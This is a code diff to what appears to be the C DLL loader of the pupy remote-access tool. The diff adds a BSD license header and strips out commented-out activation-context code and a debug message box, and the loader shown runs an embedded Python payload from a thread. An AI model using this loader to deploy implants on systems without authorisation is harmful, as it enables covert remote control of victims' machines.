@@ -1,3 +1,19 @@
+/*
+# --------------------------------------------------------------
+# Copyright (c) 2015, Nicolas VERDIER (contact@n1nj4.eu)
+# All rights reserved.
+# 
+# Redistribution and use in source and binary forms, with or without modification, are permitted provided that the following conditions are met:
+# 
+# 1. Redistributions of source code must retain the above copyright notice, this list of conditions and the following disclaimer.
+# 
+# 2. Redistributions in binary form must reproduce the above copyright notice, this list of conditions and the following disclaimer in the documentation and/or other materials provided with the distribution.
+# 
+# 3. Neither the name of the copyright holder nor the names of its contributors may be used to endorse or promote products derived from this software without specific prior written permission.
+# 
+# THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE
+# --------------------------------------------------------------
+*/
 #define QUIET // uncomment to avoid debug prints
 #include <stdlib.h>
 #include <stdio.h>
@@ -46,15 +62,6 @@ DWORD WINAPI mainThread(LPVOID lpArg)
 	char tmp_manifest_path[MAX_PATH];
 	char tmp_path[MAX_PATH];
 	ULONG_PTR cookie = 0;
-	/*
-	ACTCTX ctx;
-	BOOL activated;
-	HANDLE k32;
-	HANDLE (WINAPI *CreateActCtx)(PACTCTX pActCtx);
-	BOOL (WINAPI *ActivateActCtx)(HANDLE hActCtx, ULONG_PTR *lpCookie);
-	void (WINAPI *AddRefActCtx)(HANDLE hActCtx);
-	BOOL (WINAPI *DeactivateActCtx)(DWORD dwFlags, ULONG_PTR ulCookie);
-	*/
 	PyGILState_STATE restore_state;
 
 	if(!GetModuleHandle("msvcr90.dll")){
@@ -71,41 +78,6 @@ DWORD WINAPI mainThread(LPVOID lpArg)
 
 	GetTempPath(MAX_PATH, tmp_path);
 	//InitializeCriticalSection(&csInit);
-	/*	
-	k32 = LoadLibrary("kernel32");
-	CreateActCtx = (void*)GetProcAddress(k32, "CreateActCtxA");
-	ActivateActCtx = (void*)GetProcAddress(k32, "ActivateActCtx");
-	AddRefActCtx = (void*)GetProcAddress(k32, "AddRefActCtx");
-	DeactivateActCtx = (void*)GetProcAddress(k32, "DeactivateActCtx");
-
-
-	if (!CreateActCtx || !ActivateActCtx)
-	{
-		return 0;
-	}
-
-	ZeroMemory(&ctx, sizeof(ctx));
-	ctx.cbSize = sizeof(ACTCTX);
-	GetTempFileName(tmp_path, "tmp", 0, tmp_manifest_path);
-
-
-	f=fopen(tmp_manifest_path,"w");
-	fprintf(f,"%s",resource_python_manifest);
-	fclose(f);
-	#ifndef QUIET
-	fprintf(stderr,"manifest written to %s\n",tmp_manifest_path);
-	#endif
-	ctx.lpSource = tmp_manifest_path;
-
-	MyActCtx=CreateActCtx(&ctx);
-	if (MyActCtx != NULL)
-	{
-		AddRefActCtx(MyActCtx);
-	}
-	#ifndef QUIET
-	DeleteFile(tmp_manifest_path);
-	#endif
-	*/	
 
 	if(!Py_IsInitialized)
 	{
@@ -177,9 +149,6 @@ DWORD WINAPI mainThread(LPVOID lpArg)
 	fprintf(stderr,"initpupy()\n");
 	#endif
 
-	//mod = PyImport_ImportModule("sys");
-
-	//MessageBoxA(0, "hey ! :D", "DLL Message", MB_OK | MB_ICONINFORMATION);
 
 	/* We execute then in the context of '__main__' */
 	#ifndef QUIET
@@ -209,13 +178,6 @@ DWORD WINAPI mainThread(LPVOID lpArg)
 	//if (PyErr_Occurred())
 	//   PyErr_Print();
 	Py_Finalize();
-	/*
-	if (!DeactivateActCtx(0, actToken)){
-	#ifndef QUIET
-		fprintf(stderr,"LOADER: Error deactivating context!\n!");
-	#endif
-	}
-	*/
 	//DeleteCriticalSection(&csInit);
 
 	return 0;
